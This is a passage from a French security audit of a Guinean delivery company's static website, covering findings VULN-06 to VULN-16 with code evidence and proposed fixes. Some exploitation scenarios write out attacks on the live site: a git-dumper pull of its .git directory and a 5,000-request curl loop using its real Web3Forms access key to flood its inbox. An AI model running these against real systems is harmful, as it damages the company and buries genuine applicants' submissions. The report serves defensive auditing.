Le dépôt ne comporte **aucune étape de build** : les 12 fichiers HTML servis sont les fichiers versionnés eux-mêmes. Il n'existe ni `package.json`, ni `.gitignore`, ni fichier de configuration d'hébergement — ce qui rend le déploiement « dossier complet vers la racine web » (FTP, `rsync`, `git clone` côté serveur) le scénario le plus probable.

`seo_update.js:1-4` — script Node.js présent à la racine, aux côtés des fichiers publics :

```js
const fs = require('fs');
const path = require('path');

const domain = 'https://www.alfa.com.gn';
```

`seo_update.js:91` — il réécrit les fichiers HTML sources :

```js
fs.writeFileSync(filePath, content);
```

#### Risque concret

* **`https://www.alfa.com.gn/seo_update.js`** est très probablement servi en texte brut : divulgation de l'outillage interne, de la structure de génération et de la cartographie complète du site. Impact limité mais gratuit à éliminer.
* **`https://www.alfa.com.gn/.git/`** — si le répertoire est déployé, l'historique complet est téléchargeable via `.git/config`, `.git/HEAD` et les objets packés. Outils publics (`git-dumper`) automatisent entièrement l'extraction. Ici l'historique ne contient aucun secret (vérifié en §2.4), donc l'impact immédiat est **limité à la divulgation du code source et des métadonnées d'auteur** — mais tout secret ajouté ultérieurement (clé Firebase, jeton de déploiement) deviendrait rétroactivement exposé.
* **L'absence de `.gitignore`** est le facteur aggravant durable : rien n'empêche qu'un futur `.env`, `serviceAccountKey.json` ou `firebase-adminsdk-*.json` soit commité par inadvertance — puis publié.

#### Scénario d'exploitation

```
1. L'attaquant teste https://www.alfa.com.gn/.git/HEAD
   → si la réponse est "ref: refs/heads/main", le répertoire est exposé.

2. git-dumper https://www.alfa.com.gn/.git/ ./alfa-source
   → reconstitution intégrale du dépôt et de son historique.

3. Exploitation :
   - inventaire exhaustif des points d'entrée (formulaires, clé Web3Forms) ;
   - identification de fichiers présents sur le serveur mais non liés depuis
     la navigation ;
   - lecture de seo_update.js pour cartographier la structure du site ;
   - à terme, récupération de tout secret ajouté dans un commit ultérieur.
```

#### Correction recommandée

1. **Vérifier immédiatement** en production : `curl -I https://www.alfa.com.gn/.git/HEAD` et `curl -I https://www.alfa.com.gn/seo_update.js`. Toute réponse `200` confirme l'exposition.
2. **Créer un `.gitignore`** — mesure préventive prioritaire, indépendante de l'hébergeur.
3. **Bloquer les chemins sensibles** au niveau de l'hébergeur, ou mieux : ne déployer qu'un répertoire de publication dédié excluant `.git/`, `seo_update.js` et tout fichier d'outillage.

#### Exemple de correction (à titre indicatif — **non appliqué**)

Fichier `.gitignore` à créer :

```gitignore
# Secrets — ne doivent jamais entrer dans l'historique
.env
.env.*
*.pem
*.key
serviceAccountKey.json
firebase-adminsdk-*.json

# Dépendances et artefacts
node_modules/
dist/
.DS_Store
Thumbs.db
```

Blocage côté hébergeur (`_headers` / redirections Netlify) :

```
/.git/*        /404.html   404
/seo_update.js /404.html   404
```

Ou, sur Apache (`.htaccess`) :

```apache
RedirectMatch 404 /\.git
<FilesMatch "^(seo_update\.js|\.gitignore)$">
  Require all denied
</FilesMatch>
```

---

### VULN-07 — Protections anti-abus purement côté client : la limitation de débit et le captcha sont contournables par requête directe

* **Catégorie** : `broken_access_control` / `client_side_enforcement`
* **Gravité** : **MOYEN**
* **Confiance** : **9/10**
* **Statut** : ✅ **Confirmé**

#### Fichiers et lignes concernés

* `contact.html:680-698` — limitation de débit en `localStorage`
* `index.html:813-836` — même mécanisme dupliqué
* `chauffeur.html:301-421` et `commercant.html:281-421` — **aucune** limitation, même côté client
* Widgets hCaptcha (conteneurs vides pilotés par le script Web3Forms) : `contact.html:471-476`, `index.html:775-780`, `chauffeur.html:408-413`, `commercant.html:406-411`

#### Preuve observée dans le code

`contact.html:680-698` — le contrôle, explicitement nommé « Sécurité », repose intégralement sur une valeur stockée dans le navigateur de l'utilisateur :

```js
// Protection Anti-Spam Locale (Max 4 mails par 3 minutes)
const now = Date.now();
const rateLimitWindow = 3 * 60 * 1000; // 3 minutes
const maxRequests = 4; // Max 4 mails

let history = JSON.parse(
  localStorage.getItem("alfaFormSubmissions") || "[]",
);
history = history.filter((time) => now - time < rateLimitWindow);

if (history.length >= maxRequests) {
  alert(
    "Sécurité : Vous avez envoyé trop de messages. Veuillez patienter 3 minutes avant de réessayer.",
  );
  return; // Bloquer l'envoi
}
```

Le captcha est un simple conteneur vide (`contact.html:471-476`), rempli par le script tiers ; il n'est **jamais vérifié par le code du site** avant l'appel `fetch` de la ligne 703 :

```html
<!-- Protection gratuite hCaptcha -->
<div
  class="h-captcha"
  data-captcha="true"
  style="margin-bottom: 24px"
></div>
```

#### Risque concret

Le point de terminaison réel est `https://api.web3forms.com/submit` — **une API publique**. Toute requête émise en dehors du navigateur ignore intégralement :

* le compteur `localStorage` (effaçable en une ligne : `localStorage.clear()`, ou simplement absent en mode privé / hors navigateur) ;
* le widget hCaptcha (jamais chargé ni évalué).

Le message affiché à l'utilisateur — préfixé « **Sécurité :** » — décrit ce dispositif comme une protection, ce qui entretient une **fausse assurance** : le seul contrôle réellement opposable à un attaquant est celui appliqué par Web3Forms côté serveur, dont la configuration n'est pas visible dans le dépôt.

Par ailleurs, `chauffeur.html` et `commercant.html` **ne comportent même pas** ce contrôle client (comparer `chauffeur.html:609-618` à `contact.html:674-701`) : l'incohérence entre les quatre formulaires montre que la mesure n'a pas été conçue comme un contrôle de sécurité mais ajoutée ponctuellement.

#### Scénario d'exploitation

```
1. Depuis n'importe quel poste, sans navigateur :

   for i in $(seq 1 5000); do
     curl -s -X POST https://api.web3forms.com/submit \
       -F "access_key=003e9773-ce3d-484e-a71f-c64fe062cf9b" \
       -F "subject=Pre-inscription Chauffeur" \
       -F "prenom=Test$i" -F "telephone=62000$i" &
   done

2. Ni le compteur localStorage ni hCaptcha n'interviennent : ils n'existent
   que dans le navigateur, jamais franchi.

3. La boîte alfa6ams@gmail.com est noyée sous des candidatures fictives ;
   les vraies pré-inscriptions de chauffeurs y deviennent indiscernables et
   sont perdues — atteinte directe au canal de recrutement partenaires.
```

#### Correction recommandée

1. **Activer et vérifier la protection captcha côté Web3Forms** (tableau de bord) — c'est le seul niveau où elle est opposable, et cela conditionne l'efficacité réelle des quatre formulaires.
2. **Cesser de présenter le compteur `localStorage` comme un contrôle de sécurité** : le conserver comme simple confort d'interface (éviter les doubles clics) et retirer le préfixe « Sécurité : » du message.
3. **Cible** : déplacer la limitation de débit vers le proxy serveur décrit en VULN-01, indexée sur l'adresse IP.
4. **Uniformiser** : ajouter au minimum le même comportement sur `chauffeur.html` et `commercant.html`, aujourd'hui totalement dépourvus.

#### Exemple de correction (à titre indicatif — **non appliqué**)

```js
// Côté client : confort d'interface uniquement, sans prétention de sécurité
// (le contrôle opposable est réalisé côté serveur — cf. VULN-01)
if (submitBtn.disabled) return;   // anti double-clic
submitBtn.disabled = true;
```

```js
// Côté serveur (Cloudflare Worker) : limitation réellement opposable
export default {
  async fetch(request, env) {
    const ip = request.headers.get("CF-Connecting-IP") ?? "inconnu";
    const cle = `rl:${ip}`;
    const compteur = Number((await env.KV.get(cle)) ?? 0);

    if (compteur >= 4) {
      return new Response("Trop de requêtes", { status: 429 });
    }
    await env.KV.put(cle, String(compteur + 1), { expirationTtl: 180 });

    // … vérification hCaptcha puis relais vers Web3Forms
  },
};
```

---

### VULN-08 — Liens sociaux pointant vers des comptes tiers non contrôlés par alfa

* **Catégorie** : `unvalidated_external_link` / `phishing_surface` / `brand_abuse`
* **Gravité** : **MOYEN**
* **Confiance** : **7/10**
* **Statut** : ⚠️ **Suspicion forte** — la propriété réelle des comptes ne peut être vérifiée depuis le dépôt

#### Fichiers et lignes concernés

Présents dans le pied de page des **12 pages** :

| Lien | Exemple d'emplacement |
|---|---|
| `https://www.facebook.com/alfa/posts/` | `aide.html:839-840`, `nourriture.html:1287`, `index.html:1307`, `contact.html:601`, `chauffeur.html:548`, `commercant.html:539`, `livraison.html:428`, `telechargement.html:536`, `cgu.html:336`, `cookies.html:334`, `confidentialite.html:609`, `mentions-legales.html:314` |
| `https://www.instagram.com/alfa.guinee/reels/` | `aide.html:858-859` et 11 pages équivalentes |
| `href="#"` (X/Twitter, « Actualités ») | `nourriture.html`, footers des 12 pages |

#### Preuve observée dans le code

`aide.html:838-841` :

```html
<a
  href="https://www.facebook.com/alfa/posts/"
  target="_blank"
  rel="noopener noreferrer"
  aria-label="Facebook"
>
```

#### Risque concret

`facebook.com/alfa` est un **identifiant de page générique et ancien**, hautement improbable pour une SARL guinéenne créée récemment — il appartient selon toute vraisemblance à une entité tierce homonyme. Le chemin `/posts/` n'est de surcroît pas une URL canonique de page Facebook.

Conséquence : le site officiel d'alfa dirige ses visiteurs — dont des candidats chauffeurs sur le point de transmettre leurs coordonnées — vers une page **contrôlée par un tiers inconnu**. Ce tiers peut à tout moment modifier le contenu de sa page. Le lien étant reproduit sur les 12 pages et « validé » par le contexte du site officiel, la confiance transférée est maximale.

Le même raisonnement s'applique, à un moindre degré, au compte Instagram si celui-ci n'est pas effectivement détenu par alfa.

#### Scénario d'exploitation

```
1. Une candidate chauffeur consulte chauffeur.html, se renseigne, et clique
   sur l'icône Facebook du pied de page pour « vérifier » l'entreprise.

2. Elle atterrit sur facebook.com/alfa — page tenue par un tiers.

3. Si ce tiers est malveillant (ou si la page est ultérieurement rachetée ou
   compromise), il y publie : « Recrutement chauffeurs alfa — frais de dossier
   50 000 GNF par Mobile Money ».

4. La victime a été orientée vers cette page par le site officiel d'alfa :
   la fraude bénéficie de la caution de la marque, et alfa en supporte le
   préjudice réputationnel sans en avoir la maîtrise.
```

#### Correction recommandée

1. **Vérifier la propriété** de chaque compte lié. Remplacer par les URL canoniques des comptes réellement détenus par alfa.
2. **Retirer** tout lien vers un compte non détenu, plutôt que de laisser une URL approximative.
3. **Supprimer les liens morts** `href="#"` (icône X/Twitter, « Actualités ») ou les masquer tant que les comptes n'existent pas — un lien inerte dans un pied de page officiel dégrade la crédibilité et complique la détection d'un lien détourné.
4. **Point positif à conserver** : `rel="noopener noreferrer"` est correctement présent sur **la totalité** des 26 liens `target="_blank"` du site (§4). Cette bonne pratique doit être maintenue.

#### Exemple de correction (à titre indicatif — **non appliqué**)

```html
<!-- Lien vers un compte dont la propriété est vérifiée -->
<a
  href="https://www.facebook.com/profile.php?id=IDENTIFIANT_REEL_DE_LA_PAGE_ALFA"
  target="_blank"
  rel="noopener noreferrer"
  aria-label="Facebook alfa Guinée"
>

<!-- Icône d'un réseau non encore ouvert : bouton inerte, pas un faux lien -->
<span class="footer-social-disabled" aria-hidden="true" title="Bientôt disponible">
  <!-- svg -->
</span>
```

---

### VULN-09 — Échappement d'expression régulière défectueux dans la recherche du centre d'aide

* **Catégorie** : `regex_injection` / `input_handling`
* **Gravité** : **MOYEN**
* **Confiance** : **9/10** sur le défaut · **9/10** sur l'**absence** de XSS
* **Statut** : ✅ **Défaut confirmé** — ❌ **XSS écartée après analyse**

#### Fichiers et lignes concernés

`aide.html:923-975`, cœur du défaut aux **lignes 928-935**

#### Preuve observée dans le code

`aide.html:928-935` (octets bruts vérifiés au `cat -A`) :

```js
const highlightText = (text, search) => {
  if (!search) return text;
  const regex = new RegExp(
    `(${search.replace(/[.*+?^${}()|[\\]\\\\]/g, "\\\\$&")})`,
    "gi",
  );
  return text.replace(regex, "<mark>$1</mark>");
};
```

**Décomposition du motif `/[.*+?^${}()|[\\]\\\\]/`** :

| Segment | Interprétation réelle |
|---|---|
| `[.*+?^${}()|[\\]` | classe de caractères — se **termine** au premier `]` non échappé |
| `\\` `\\` | deux antislashs littéraux, **hors** de la classe |
| `]` | crochet fermant littéral |

Le motif compilé signifie donc : « un caractère spécial, **suivi de deux antislashs, suivis d'un crochet fermant** ». Une telle séquence n'apparaît jamais dans une saisie de recherche réelle. **La fonction d'échappement est un no-op.**

De plus, le remplacement `"\\\\$&"` vaut en JavaScript la chaîne `\\$&`, qui insérerait un antislash littéral **avant** le caractère — et non l'échappement attendu `\$&`.

Résultat effectif à la ligne 931 :

```js
new RegExp("(" + saisieUtilisateurBrute + ")", "gi")   // aucun échappement
```

#### Risque concret

1. **Rupture fonctionnelle immédiate** : taper `(`, `[`, `*`, `+` ou `?` dans le champ de recherche lève une `SyntaxError` non capturée à l'intérieur du gestionnaire `input`. La recherche du centre d'aide cesse de répondre pour le reste de la session, sans message à l'utilisateur.
2. **Injection d'expression régulière** : l'utilisateur contrôle intégralement le motif compilé — comportements de correspondance non prévus, motifs à retour arrière coûteux.
3. **Faux sentiment de sécurité** : le code *paraît* échapper les métacaractères. Une revue superficielle conclurait à une entrée assainie, alors qu'elle ne l'est pas du tout.

#### ⚠️ Pourquoi il ne s'agit **pas** d'une XSS — analyse explicite

Ce point mérite d'être tranché, car le motif `innerHTML` + saisie utilisateur y ressemble fortement. Trois vérifications l'écartent :

1. **La saisie n'atteint jamais le DOM.** À la ligne 934, `text.replace(regex, "<mark>$1</mark>")` — `$1` désigne le fragment capturé **dans `text`**, c'est-à-dire dans le contenu statique d'origine sauvegardé aux lignes 916-922. Le contenu réinjecté en `innerHTML` (lignes 957-964) est toujours un sous-ensemble du HTML de confiance de la page, augmenté de balises `<mark>` littérales. La chaîne saisie par l'utilisateur n'est jamais écrite dans le document.
2. **`<mark>` ne peut pas former de vecteur.** Un motif habilement construit peut déplacer la coupure à l'intérieur d'une balise existante, produisant du HTML malformé — mais `<mark>` ne contient ni guillemet, ni `=`, ni `javascript:`. Il ne permet ni de créer un attribut, ni de fermer une balise pour en ouvrir une autre.
3. **Aucune amorce depuis l'URL.** Vérification effectuée sur l'ensemble du dépôt : `searchInput.value` n'est alimenté par aucune source externe. Les seules lectures de `window.location.hash` (`aide.html:173`, et l'équivalent dans les 11 autres pages) alimentent uniquement une classe CSS anti-scintillement, jamais le champ de recherche. Il n'existe donc **aucun vecteur réfléchi** : un attaquant ne peut pas pré-remplir la recherche via un lien.

**Conclusion** : défaut de robustesse et d'assainissement réel, **sans impact XSS exploitable**. Classé MOYEN pour la rupture fonctionnelle et le caractère trompeur du code, pas pour une exécution de script.

#### Scénario d'exploitation

```
1. Un utilisateur du centre d'aide tape « (livraison » ou « prix ? » dans le
   champ de recherche.
2. new RegExp("((livraison", "gi") lève une SyntaxError dans le gestionnaire
   d'événement « input ».
3. Le gestionnaire est interrompu : les cartes restent figées dans leur état
   précédent, la recherche ne répond plus, aucun message n'est affiché.
4. L'utilisateur, ne trouvant pas sa réponse, se rabat sur le support
   téléphonique ou abandonne — dégradation d'un canal d'assistance.
```

#### Correction recommandée

Utiliser une fonction d'échappement correcte et éprouvée, envelopper la compilation dans un `try/catch`, et — surtout — cesser de recourir à `innerHTML` en s'appuyant sur l'API `Range`/`textContent` ou sur `CSS.highlights`.

#### Exemple de correction (à titre indicatif — **non appliqué**)

```js
// 1) Échappement correct (référence MDN)
const escapeRegExp = (chaine) =>
  chaine.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

// 2) Compilation défensive
const highlightText = (text, search) => {
  if (!search) return text;
  let regex;
  try {
    regex = new RegExp(`(${escapeRegExp(search)})`, "gi");
  } catch {
    return text;              // saisie ininterprétable : on n'altère rien
  }
  return text.replace(regex, "<mark>$1</mark>");
};
```

```js
// 3) Variante recommandée : plus aucun innerHTML
//    (sauvegarder item.h3 / item.p en textContent plutôt qu'en innerHTML)
const surligner = (element, texteOriginal, terme) => {
  element.textContent = "";                       // purge sûre
  if (!terme) { element.textContent = texteOriginal; return; }

  const bas = texteOriginal.toLowerCase();
  const cible = terme.toLowerCase();
  let position = 0, index;

  while ((index = bas.indexOf(cible, position)) !== -1) {
    element.append(texteOriginal.slice(position, index));
    const mark = document.createElement("mark");
    mark.textContent = texteOriginal.slice(index, index + terme.length);
    element.append(mark);
    position = index + terme.length;
  }
  element.append(texteOriginal.slice(position));
};
```

---

## 🔵 FAIBLE

---

### VULN-10 — Construction d'URI `intent://` non défensive dans `smartLink()`

* **Catégorie** : `unsafe_redirect` / `code_quality`
* **Gravité** : **FAIBLE**
* **Confiance** : **8/10**
* **Statut** : ✅ **Défaut confirmé** — **non exploitable en l'état** (toutes les valeurs sont statiques)

**Fichier et lignes** : `telechargement.html:629-657`, cœur du défaut **ligne 651**

**Preuve observée** — `telechargement.html:648-655` :

```js
if (platform === "android") {
  // Tentative d'ouverture de l'application via intent URI
  // Fallback sur le store si l'app n'est pas trouvée
  window.location.href = `intent://#Intent;scheme=${scheme.replace("://", "")};package=${storeUrl.split("id=")[1]};end`;
  // Backup classique : rediriger vers le store après un court délai
  setTimeout(() => {
    window.location.href = storeUrl;
  }, 1500);
}
```

**Risque concret** — `storeUrl.split("id=")[1]` extrait le nom de paquet Android par découpage de chaîne. Aujourd'hui, les trois valeurs possibles de `storeUrl` sont des littéraux définis lignes 635-647 (`com.alfa.client`, `com.alfa.merchant`, `com.alfa.driver`) : la construction est donc **sûre en l'état**. Le défaut est structurel : si `appType` prend une valeur inattendue, `scheme` et `storeUrl` restent des chaînes vides (aucun `else` final), et l'URI produite devient `intent://#Intent;scheme=;package=undefined;end` — une navigation vers un URI malformé. Le motif « découper une URL à la chaîne pour en réinjecter un fragment dans un URI de navigation » est fragile : toute évolution rendant `appType` ou `storeUrl` dynamique (paramètre de campagne, lien de parrainage) le transformerait en redirection contrôlable.

À noter également, **ligne 630** : `event.preventDefault()` s'appuie sur la variable globale `window.event`, non standard et absente en mode strict — le lien peut donc naviguer vers `#` malgré l'appel.

**Scénario d'exploitation** — Aucun en l'état. En cas d'évolution (`smartLink(new URLSearchParams(location.search).get("app"), "android")`), un attaquant forgerait `?app=…` pour piloter le paquet ciblé et rediriger l'utilisateur vers une application tierce ou un `intent://` arbitraire — d'où le classement FAIBLE plutôt qu'informationnel.

**Correction recommandée** — Déclarer une table de correspondance explicite, valider la clé, transmettre l'événement en paramètre, et prévoir le repli navigateur natif de l'URI `intent://`.

**Exemple de correction (non appliqué)** :

```js
const APPLICATIONS = Object.freeze({
  client:   { scheme: "alfa",        paquet: "com.alfa.client"   },
  merchant: { scheme: "alfamerchant", paquet: "com.alfa.merchant" },
  driver:   { scheme: "alfadriver",   paquet: "com.alfa.driver"   },
});

function smartLink(event, appType, platform) {
  event.preventDefault();                       // événement explicite

  const app = APPLICATIONS[appType];
  if (!app) return;                             // clé inconnue : on n'agit pas

  const storeUrl =
    `https://play.google.com/store/apps/details?id=${app.paquet}`;

  if (platform !== "android") { window.location.href = storeUrl; return; }

  // Repli géré nativement par Android, sans setTimeout
  window.location.href =
    `intent://#Intent;scheme=${app.scheme};package=${app.paquet};` +
    `S.browser_fallback_url=${encodeURIComponent(storeUrl)};end`;
}
```

```html
<a href="#" onclick="smartLink(event, 'client', 'android')">Télécharger</a>
```

---

### VULN-11 — Absence de `.gitignore` : aucun garde-fou contre la fuite future de secrets

* **Catégorie** : `secrets_management` / `preventive_control`
* **Gravité** : **FAIBLE** (préventif — deviendrait CRITIQUE en cas de réalisation)
* **Confiance** : **10/10**
* **Statut** : ✅ **Confirmé**

**Fichier concerné** : `.gitignore` — **absent de la racine du dépôt**

**Preuve observée** — Listage direct de la racine : aucun `.gitignore`. L'analyse de l'historique (§2.4) confirme qu'aucun fichier de ce type n'a jamais existé.

**Risque concret** — Le projet ne comporte aujourd'hui aucun secret côté serveur, la clé Web3Forms étant publique par conception. Mais la politique de confidentialité (`confidentialite.html:414-427`) annonce l'usage de **Firebase** et de **FedaPay** — deux services dont l'intégration s'accompagne systématiquement de fichiers d'identifiants (`serviceAccountKey.json`, `firebase-adminsdk-*.json`, `.env` contenant les clés API FedaPay). Sans `.gitignore`, un `git add .` les enverra dans l'historique, où ils resteront durablement même après suppression — et, si `.git/` est exposé (VULN-06), publiquement téléchargeables.

**Scénario d'exploitation** :

```
1. Un développeur intègre le paiement FedaPay et crée .env à la racine.
2. Il exécute git add . && git commit -m "paiement" && git push.
3. La clé secrète FedaPay entre dans l'historique public du dépôt.
4. Un attaquant la récupère (dépôt distant, ou .git/ exposé — cf. VULN-06)
   et effectue des opérations de paiement au nom d'alfa.
```

**Correction recommandée** — Créer un `.gitignore` **avant** toute intégration Firebase ou FedaPay. Voir le modèle fourni en VULN-06.

---

### VULN-12 — Usage de `document.write()` sur les 12 pages

* **Catégorie** : `code_quality` / `csp_incompatibility`
* **Gravité** : **FAIBLE**
* **Confiance** : **10/10**
* **Statut** : ✅ **Confirmé**

**Fichiers et lignes** : `index.html:1366`, `aide.html:898`, `cgu.html:395`, `chauffeur.html:607`, `commercant.html:598`, `confidentialite.html:668`, `contact.html:660`, `cookies.html:393`, `livraison.html:487`, `mentions-legales.html:373`, `nourriture.html:1346`, `telechargement.html:595`

**Preuve observée** — motif identique dans les 12 pieds de page :

```html
<p class="copyright">
  &copy;
  <script>
    document.write(new Date().getFullYear());
  </script>
  alfa. Tous droits réservés.
</p>
```

**Risque concret** — `document.write()` n'introduit ici aucune vulnérabilité : l'argument est `new Date().getFullYear()`, un entier non contrôlable. L'impact est indirect mais réel :
* l'API est bloquée par les navigateurs sur connexion lente (Chrome « intervention »), pouvant faire disparaître l'année du pied de page ;
* elle **empêche l'adoption d'une CSP stricte**, obligeant à conserver `'unsafe-inline'` dans `script-src` (VULN-02) ;
* elle constitue un motif à risque : si un développeur y injecte un jour une valeur dynamique, la XSS est immédiate.

**Scénario d'exploitation** — Aucun en l'état. Le classement FAIBLE reflète le blocage du durcissement CSP.

**Correction recommandée** — Remplacer par une écriture DOM sûre dans `js/main.js`, mutualisée pour les 12 pages.

**Exemple de correction (non appliqué)** :

```html
<p class="copyright">
  &copy; <span data-annee-courante></span> alfa. Tous droits réservés.
</p>
```

```js
// js/main.js — dans le gestionnaire DOMContentLoaded existant
document.querySelectorAll("[data-annee-courante]").forEach((el) => {
  el.textContent = String(new Date().getFullYear());
});
```

---

### VULN-13 — Scripts en ligne et attributs `onclick=` répartis sur l'ensemble du site

* **Catégorie** : `code_quality` / `csp_incompatibility`
* **Gravité** : **FAIBLE**
* **Confiance** : **10/10**
* **Statut** : ✅ **Confirmé** — **aucune donnée utilisateur impliquée**

**Fichiers et lignes** — 28 attributs `onclick=` recensés, tous à valeurs statiques :

| Motif | Occurrences | Exemples |
|---|---:|---|
| `onclick="event.stopPropagation()"` | 6 | `nourriture.html` (modales) |
| `onclick="openModal('modal-…')"` | 6 | `nourriture.html:1181-1190` |
| `onclick="closeModal(event, 'modal-…')"` / `closeModal(null, …)` | 12 | `nourriture.html` |
| `onclick="smartLink('client'|'merchant'|'driver', 'android')"` | 3 | `telechargement.html` |
| `onclick="doGTranslate('fr|xx'); return false;"` | 36 (3 × 12 pages) | `aide.html:269-290` |

S'y ajoutent une trentaine de blocs `<script>` en ligne (gestionnaires de formulaires, GTranslate, anti-scintillement, modales).

**Preuve observée** — `aide.html:266-275` :

```html
<div class="dropdown-content lang-dropdown">
  <a
    href="javascript:void(0);"
    onclick="
      doGTranslate('fr|fr');
      return false;
    "
    title="Français"
    >🇫🇷 Français</a
  >
```

**Risque concret** — Aucune de ces valeurs n'est dérivée d'une entrée utilisateur : il n'y a **pas** d'injection possible. Le risque est de second ordre : cette dispersion **interdit la mise en place d'une CSP sans `'unsafe-inline'`**, c'est-à-dire précisément la mesure qui contiendrait VULN-03. C'est le principal frein technique au durcissement du site.

**Correction recommandée** — Externaliser progressivement : remplacer `onclick=` par `data-*` + `addEventListener` dans `js/main.js`, et déplacer les gestionnaires de formulaires dans des fichiers `.js` dédiés. La CSP pourra alors passer à `script-src 'self'`.

**Exemple de correction (non appliqué)** :

```html
<a href="#" class="lang-option" data-lang="fr|en" title="English">🇬🇧 English</a>
```

```js
// js/main.js
document.querySelectorAll(".lang-option").forEach((lien) => {
  lien.addEventListener("click", (e) => {
    e.preventDefault();
    doGTranslate(lien.dataset.lang);
  });
});
```

---

### VULN-14 — Le formulaire reste soumissible si le script hCaptcha ne se charge pas

* **Catégorie** : `fail_open` / `broken_access_control`
* **Gravité** : **FAIBLE**
* **Confiance** : **8/10**
* **Statut** : ⚠️ **Suspicion** — le comportement final dépend de la configuration Web3Forms (hors dépôt)

**Fichiers et lignes** : `contact.html:471-476` + `contact.html:702-709` · `index.html:775-780` + `841-845` · `chauffeur.html:408-413` + `629-633` · `commercant.html:406-411` + `620-624`

**Preuve observée** — le conteneur captcha est vide et rempli par le script tiers ; aucune vérification n'est effectuée avant l'envoi. `contact.html:702-709` :

```js
const formData = new FormData(form);
fetch("https://api.web3forms.com/submit", {
  method: "POST",
  headers: { Accept: "application/json" },
  body: formData,
})
```

Aucun contrôle de `h-captcha-response` n'apparaît entre la ligne 471 (conteneur) et la ligne 702 (envoi).

**Risque concret** — Si `https://web3forms.com/client/script.js` (chargé en `contact.html:731` avec `async defer`) est bloqué — bloqueur de publicité, filtrage réseau, indisponibilité du CDN, connexion dégradée fréquente en contexte mobile guinéen —, le widget n'est jamais rendu. Le gestionnaire de soumission s'exécute néanmoins et transmet le formulaire sans champ `h-captcha-response`. L'acceptation ou le rejet dépend alors entièrement d'un réglage Web3Forms non visible dans le dépôt : conception en **fail-open** côté client.

**Scénario d'exploitation** — Un robot ignorant simplement le chargement du script tiers soumet des formulaires en boucle ; combiné à VULN-07 (aucune limitation opposable), le canal de pré-inscription partenaires est saturable.

**Correction recommandée** — Vérifier la présence du jeton avant l'envoi (garde-fou d'interface) et, surtout, **imposer la vérification côté serveur** via `api.hcaptcha.com/siteverify` (voir VULN-01).

**Exemple de correction (non appliqué)** :

```js
// Garde-fou côté client — la vérification opposable reste côté serveur
const jetonCaptcha = form.querySelector('[name="h-captcha-response"]')?.value;
if (!jetonCaptcha) {
  alert("Veuillez valider le contrôle anti-robot avant d'envoyer.");
  submitBtn.disabled = false;
  return;
}
```

---

### VULN-15 — Duplication du code de soumission sur quatre pages, avec contrôles divergents

* **Catégorie** : `code_quality` / `maintainability`
* **Gravité** : **FAIBLE**
* **Confiance** : **10/10**
* **Statut** : ✅ **Confirmé**

**Fichiers et lignes** : `contact.html:671-728`, `index.html:803-866`, `chauffeur.html:609-653`, `commercant.html:609-645`

**Preuve observée** — Comparaison des quatre gestionnaires :

| Page | Limitation `localStorage` | Réinitialisation du bouton | Nombre de lignes |
|---|:---:|:---:|---:|
| `contact.html` | ✅ (680-698) | dans `.then` / `.catch` | 58 |
| `index.html` | ✅ (813-836) | dans `.finally` | 64 |
| `chauffeur.html` | ❌ **absente** | dans `.then` / `.catch` | 45 |
| `commercant.html` | ❌ **absente** | dans `.then` / `.catch` | 37 |

**Risque concret** — Le même code est recopié quatre fois avec des variantes. En sécurité, ce motif produit une **application inégale des contrôles** : la protection ajoutée à `contact.html` n'a jamais été reportée sur `chauffeur.html` ni `commercant.html`, précisément les deux formulaires qui collectent le plus de données personnelles. Toute correction future (validation, captcha, proxy) devra être appliquée quatre fois, avec un risque élevé d'oubli. Cette duplication est d'ailleurs la cause directe de l'incohérence relevée en VULN-07.

**Correction recommandée** — Extraire un module unique `js/form-handler.js` importé par les quatre pages, paramétré par `data-*`.

**Exemple de correction (non appliqué)** :

```html
<form id="contactForm" data-alfa-form data-succes="contact-success">…</form>
<script src="js/form-handler.js" defer></script>
```

```js
// js/form-handler.js — logique unique, contrôles appliqués partout
document.querySelectorAll("[data-alfa-form]").forEach((form) => {
  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const bouton = form.querySelector('button[type="submit"]');
    if (bouton.disabled) return;
    bouton.disabled = true;
    try {
      const r = await fetch("/api/contact", { method: "POST", body: new FormData(form) });
      if (!r.ok) throw new Error(String(r.status));
      form.style.display = "none";
      document.getElementById(form.dataset.succes).style.display = "block";
    } catch {
      alert("Une erreur s'est produite. Veuillez réessayer.");
      bouton.disabled = false;
    }
  });
});
```

---

### VULN-16 — `seo_update.js` : réécriture des sources par expressions régulières, sans sauvegarde

* **Catégorie** : `code_quality` / `build_integrity`
* **Gravité** : **FAIBLE**
* **Confiance** : **9/10**
* **Statut** : ✅ **Confirmé** — outil de build, **non exposé à une entrée non fiable**

**Fichier et lignes** : `seo_update.js:66-91`

**Preuve observée** — `seo_update.js:66-91` :

```js
let content = fs.readFileSync(filePath, 'utf8');

// Remove old tags to prevent duplicates
content = content.replace(/<title>.*?<\/title>/gis, '');
content = content.replace(/<meta\s+name=["']description["'][^>]*>/gi, '');
content = content.replace(/<meta\s+property=["']og:[^>]*>/gi, '');
content = content.replace(/<link\s+rel=["']canonical["'][^>]*>/gi, '');
…
content = content.replace(/^\s*[\r\n]/gm, '');

fs.writeFileSync(filePath, content);
```

**Risque concret** — Le script **écrase les fichiers HTML sources en place**, sans sauvegarde ni contrôle d'intégrité. L'analyse HTML par expressions régulières est intrinsèquement fragile : `/<title>.*?<\/title>/gis` supprime aussi un `<title>` figurant dans un `<svg>` en ligne — or le site en contient des dizaines. `/^\s*[\r\n]/gm` supprime toutes les lignes vides du document, y compris à l'intérieur des blocs `<style>` et `<script>`. Une exécution malencontreuse peut corrompre silencieusement les 12 pages du site.

Les données injectées (lignes 74-83) sont des littéraux définis dans le fichier même : **aucune entrée non fiable n'intervient**, il n'y a donc pas d'injection de contenu possible.

**Scénario d'exploitation** — Aucun scénario d'attaque. Le risque est opérationnel : exécution accidentelle → corruption des pages en production. Aggravé par l'absence de sauvegarde et par le fait que le script est publiquement lisible s'il est déployé (VULN-06).

**Correction recommandée** — Déplacer le script hors de la racine web (`tools/`), écrire dans un répertoire de sortie plutôt qu'en place, et l'exclure du déploiement.

**Exemple de correction (non appliqué)** :

```js
// tools/seo_update.js — écriture hors de l'arborescence source
const SORTIE = path.join(__dirname, '..', 'dist');
fs.mkdirSync(SORTIE, { recursive: true });
fs.writeFileSync(path.join(SORTIE, file), content);   // jamais en place
```

---

## ⚪ INFORMATIONNEL

---

### INFO-01 — Identifiants Google Analytics et Meta Pixel factices (comportement correct)

**Fichier et lignes** : `js/cookies-consent.js:10-11`, `175-184`, `213-222`

```js
